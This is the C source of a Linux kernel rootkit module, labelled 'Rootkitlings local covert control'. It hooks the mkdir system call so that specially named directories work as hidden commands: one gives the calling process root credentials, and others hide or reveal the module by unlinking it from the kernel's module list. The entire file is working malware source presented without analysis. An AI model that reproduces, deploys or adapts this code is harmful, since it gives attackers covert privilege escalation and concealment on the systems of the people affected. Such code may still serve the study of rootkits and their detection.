// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX "rkling."
#define RK_PREFIX_LEN 7
#define RK_PATH_MAX 128

static struct list_head *saved_prev;
static bool cloaked;
static struct proc_dir_entry *proc_entry;

static void rk_module_cloak(void)
{
	if (cloaked)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	cloaked = true;
}

static void rk_module_uncloak(void)
{
	if (!cloaked)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	cloaked = false;
}

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

static int rk_parse_local_command(const char *path)
{
	const char *cmd;

	if (strncmp(path, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return -ENOENT;
	cmd = path + RK_PREFIX_LEN;

	if (strcmp(cmd, "e") == 0)
		return rk_escalate();
	if (strcmp(cmd, "h.m") == 0) {
		rk_module_cloak();
		return 0;
	}
	if (strcmp(cmd, "u.m") == 0) {
		rk_module_uncloak();
		return 0;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (void *)inst->data;
	struct pt_regs *uregs;
	const char __user *pathname;
	char buf[RK_PATH_MAX];
	long copied;

	data->intercepted = false;
	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	pathname = (const char __user *)uregs->di;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;
	{
		const char *base = strrchr(buf, '/');

		base = base ? base + 1 : buf;
		if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
			return 0;
		data->result = rk_parse_local_command(base);
	}
	data->intercepted = true;
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_return(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (void *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler = rk_mkdir_entry,
	.handler = rk_mkdir_return,
	.data_size = sizeof(struct rk_mkdir_data),
	.maxactive = 8,
};

static int rk_show(struct seq_file *out, void *unused)
{
	(void)unused;
	seq_printf(out, "module: %s\n", cloaked ? "hidden" : "visible");
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_proc_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

static int __init rk_init(void)
{
	int error;

	error = register_kretprobe(&mkdir_probe);
	if (error)
		return error;

	proc_entry = proc_create("rkling_status", 0400, NULL, &rk_proc_ops);
	if (!proc_entry) {
		unregister_kretprobe(&mkdir_probe);
		return -ENOMEM;
	}
	return 0;
}

static void __exit rk_exit(void)
{
	rk_module_uncloak();
	proc_remove(proc_entry);
	unregister_kretprobe(&mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings local covert control");
